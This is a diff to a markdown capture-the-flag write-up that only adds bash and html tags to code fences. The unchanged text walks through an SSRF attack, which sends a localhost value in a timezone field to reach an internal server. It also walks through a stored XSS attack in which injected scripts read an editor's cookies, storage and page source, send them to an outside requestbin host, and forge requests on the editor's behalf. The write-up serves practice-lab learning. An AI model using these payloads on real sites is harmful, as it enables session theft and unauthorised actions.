@@ -8,14 +8,14 @@ Server-side request forgery ([SSRF](https://portswigger.net/web-security/ssrf))
 After examining the sources of the main page we can see that there is a `.js` script embedded in the HTML source page. The script calls `/time` API endpoint of the application.
 
 So let's try calling the endpoint ourselves using `curl`:
-```
+```bash
 $ curl -XPOST -H "Content-type: application/json" -d '{"timezone": "warsaw"}' 'web.kazet.cc:31339/time'
 
 {"info":"17:13:38","status":"ok"}
 ```
 
 We succesfully reached the endpoint and received the information about the time in Warsaw. Let's try to break something with the following payload:
-```
+```bash
 $ curl -XPOST -H "Content-type: application/json" -d '{"timezone": "foo"}'
  'web.kazet.cc:31339/time'
 
@@ -24,7 +24,7 @@ $ curl -XPOST -H "Content-type: application/json" -d '{"timezone": "foo"}'
 
 So we see that after us calling `/time` endpoint, application tried to reach some internal API located at `<input>.timezone.internal`. Let's try to access local server of the application:
 
-```
+```bash
 $ curl -XPOST -H "Content-type: application/json" -d '{"timezone": "localhost:80/#"}' 'web.kazet.cc:31339/time'
 
 {"info":"FLAG{0c55606a072a912d264846cd22c95020e781}","status":"ok"}
@@ -64,7 +64,7 @@ Cross-site scripting ([XSS](https://portswigger.net/web-security/cross-site-scri
 After logging in the application we are able to create and send an article - http://web.kazet.cc:31339/send_article. We can see that after sending the article, the content is being sent to the editor for the review. It may be an opportuninty to attack the editor (who probably has more priviliges than us). We are going to send some malicious JS script which will be injected into editor's HTML and then executed on his side.<br/> <br/>
 But we need to somehow follow the results of the code that is executed by editor. Let's create a simple [requestbin](https://requestbin.com/) container where "editor" will be sending the results to. In my case the requestbin can be accessed at https://eozy3pwhxz589s.m.pipedream.net. <br/><br/>
 The blueprint of our malicious script will look like this:
-```
+```html
 <script>
     // Do something as editor
     /* ... */
@@ -99,7 +99,7 @@ So `<script>` is being translated to `&lt;script&gt;`. No worries, let's just re
 And now it works! We received hello from editor.
 
 Let's retrieve some data that may interest us with a following script:
-```
+```html
 <script>
     // Retrieve cookies, storage, location and HTML source
     const data = {
@@ -128,7 +128,7 @@ But we found 2 interesting things in `location` and `source` fields.
 * In the HTML source, we can see that there is one additional endpoint accessible for the editor - `/send_feedback`.
   
 Let's check what editor sees after accessing this endpoint with Http `GET` method:
-```
+```html
 <script>
     // Send the request to GET send_feedback on editor's behalf
     let req = new XMLHttpRequest();
@@ -157,7 +157,7 @@ Let's check what editor sees after accessing this endpoint with Http `GET` metho
 ```
 
 We successfully received the HTML source. In the source we can find an HTML form:
-```
+```html
 <form method="POST">
   <div class="form-group">
     <label for="receiver">Login odbiorcy</label>
@@ -179,7 +179,7 @@ We successfully received the HTML source. In the source we can find an HTML form
 
 Editor can send the feedback about the article to the user. Let's try sending the feedback to ourselves (in my case, login is `kokokoko`).
 
-```
+```html
 <script>
 
     let req = new XMLHttpRequest();
@@ -208,14 +208,14 @@ Editor can send the feedback about the article to the user. Let's try sending th
 </script>
 ```
 And... nothing happens. The only thing that changed is editor receiving info about delivering the feedback:
-```
+```html
 <div class="alert alert-primary" role="alert">Wysłano informację zwrotną</div>
 ```
 But our user doesn't receive any feedback. I've been stuck here for a couple of hours, trying to find the feedback in the database (using SQL injection vulnerability) or other weird places.      
   
 Finally, I've found the solution. We are missing the `Content-Type` header in our request. This header is automagically set with a corresponding value by browser when hitting `SUBMIT` in the form. So here is the final version of the malicious script.
 
-```
+```html
 <script>
 
     let req = new XMLHttpRequest();
@@ -246,7 +246,7 @@ Finally, I've found the solution. We are missing the `Content-Type` header in ou
 </script>
 ```
 After refreshing the page on our side (while being logged-in), we can find the flag:
-```
+```html
 <div class="alert alert-primary" role="alert">
     Informacja zwrotna: abc<br>
     flaga: FLAG{752e8db03d875cfec6bdf8305756f1bb}
